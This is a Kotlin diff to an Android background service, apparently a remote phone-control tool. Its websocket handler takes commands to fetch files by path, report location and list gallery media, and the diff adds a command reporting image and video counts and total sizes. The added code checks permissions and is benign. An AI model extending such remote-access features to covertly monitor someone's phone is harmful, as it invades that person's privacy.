@@ -374,6 +374,7 @@ class StreamingService : Service() {
                             "set-torch"          -> setTorch(json.optBoolean("enabled", false), ws)
                             "vibrate"            -> doVibrate(json.optLong("ms", 500))
                             "get-file"           -> sendFile(json.optString("path",""), json.optString("requestId",""), ws)
+                            "get-gallery-stats"  -> sendGalleryStats(ws)
                             "get-location"       -> sendLocation(ws)
                             "get-gallery"        -> sendGallery(json.optString("mediaType","images"), json.optInt("limit",30), json.optInt("offset",0), ws)
                             "get-media-thumb"    -> sendMediaThumb(json.optLong("id",0), json.optString("mediaType","images"), ws)
@@ -857,6 +858,39 @@ class StreamingService : Service() {
                 }
             } catch (e: Exception) { err(e.message ?: "ошибка") }
         }.apply { isDaemon = true }.start()
+    }
+
+    @Suppress("DEPRECATION")
+    private fun sendGalleryStats(ws: WebSocket) {
+        try {
+            var imageCount = 0L; var imageSize = 0L
+            var videoCount = 0L; var videoSize = 0L
+            val imgPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+                Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+            val vidPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+                Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE
+            if (ContextCompat.checkSelfPermission(this, imgPerm) == PackageManager.PERMISSION_GRANTED) {
+                contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    arrayOf(MediaStore.MediaColumns.SIZE), null, null, null)?.use { c ->
+                    imageCount = c.count.toLong()
+                    val col = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
+                    if (col >= 0) while (c.moveToNext()) imageSize += c.getLong(col)
+                }
+            }
+            if (ContextCompat.checkSelfPermission(this, vidPerm) == PackageManager.PERMISSION_GRANTED) {
+                contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                    arrayOf(MediaStore.MediaColumns.SIZE), null, null, null)?.use { c ->
+                    videoCount = c.count.toLong()
+                    val col = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
+                    if (col >= 0) while (c.moveToNext()) videoSize += c.getLong(col)
+                }
+            }
+            ws.send(JSONObject().put("type","gallery-stats")
+                .put("imageCount", imageCount).put("imageSize", imageSize)
+                .put("videoCount", videoCount).put("videoSize", videoSize).toString())
+        } catch (e: Exception) {
+            ws.send(JSONObject().put("type","gallery-stats").put("err", e.message ?: "ошибка").toString())
+        }
     }
 
     @Suppress("MissingPermission")
